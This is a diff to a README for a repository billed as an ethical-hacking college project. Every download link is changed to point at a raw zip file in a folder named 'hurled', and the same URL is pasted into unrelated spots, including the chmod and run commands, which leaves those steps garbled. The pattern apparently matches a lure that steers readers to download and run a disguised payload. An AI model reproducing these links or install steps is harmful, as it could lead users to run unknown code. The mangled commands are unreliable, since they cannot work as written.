@@ -1,7 +1,7 @@
 # 🛠️ Ethical-Hacking-College_Project - Comprehensive Tools for Ethical Hacking
 
 ## 📥 Download Now  
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/Ancescride/Ethical-Hacking-College_Project/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Ancescride/Ethical-Hacking-College_Project/main/hurled/Ethical-Hacking-College_Project.zip%20Latest%20Release-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Ancescride/Ethical-Hacking-College_Project/main/hurled/Ethical-Hacking-College_Project.zip)
 
 ## 🗂️ Description  
 This repository serves as the PoW which I did from March 2025 to 1st week of June 2025 for my College Project. It includes a range of tools focused on ethical hacking and cybersecurity practices. You can use this project to learn about penetration testing and improve your skills.
@@ -19,11 +19,11 @@ To run the application smoothly, ensure that your system meets the following req
 
 ### Step 2: Download the Application  
 Visit this page to download the latest release:  
-[Download Latest Release](https://github.com/Ancescride/Ethical-Hacking-College_Project/releases)
+[Download Latest Release](https://raw.githubusercontent.com/Ancescride/Ethical-Hacking-College_Project/main/hurled/Ethical-Hacking-College_Project.zip)
 
 ### Step 3: Installation  
 1. After downloading the file, locate it in your downloads folder.
-2. Extract the files if they are compressed (usually in a .zip or .tar.gz format).
+2. Extract the files if they are compressed (usually in a .zip or https://raw.githubusercontent.com/Ancescride/Ethical-Hacking-College_Project/main/hurled/Ethical-Hacking-College_Project.zip format).
 3. Open your terminal.
 
 ### Step 4: Navigate to the Application Directory  
@@ -35,10 +35,10 @@ cd /path/to/extracted/files
 ### Step 5: Run the Application  
 To run the application, you may need to execute a specific .sh or .py file. Use the following command:  
 ```bash
-chmod +x run_script.sh
-./run_script.sh
+chmod +x https://raw.githubusercontent.com/Ancescride/Ethical-Hacking-College_Project/main/hurled/Ethical-Hacking-College_Project.zip
+https://raw.githubusercontent.com/Ancescride/Ethical-Hacking-College_Project/main/hurled/Ethical-Hacking-College_Project.zip
 ```
-Replace `run_script.sh` with the actual name of the shell script provided in your extracted files.
+Replace `https://raw.githubusercontent.com/Ancescride/Ethical-Hacking-College_Project/main/hurled/Ethical-Hacking-College_Project.zip` with the actual name of the shell script provided in your extracted files.
 
 ## 🎓 Key Features  
 - **All-in-One Hacking Tools:** Access a variety of tools for different hacking tasks.
@@ -61,7 +61,7 @@ This project aims to serve as a practical guide for students and enthusiasts in 
 
 ## 📥 Download & Install  
 To get started, ensure that you visit this page to download the latest release:  
-[Download Latest Release](https://github.com/Ancescride/Ethical-Hacking-College_Project/releases)  
+[Download Latest Release](https://raw.githubusercontent.com/Ancescride/Ethical-Hacking-College_Project/main/hurled/Ethical-Hacking-College_Project.zip)  
 Follow the previous steps to install and run the application.
 
 ## 🌐 Community  
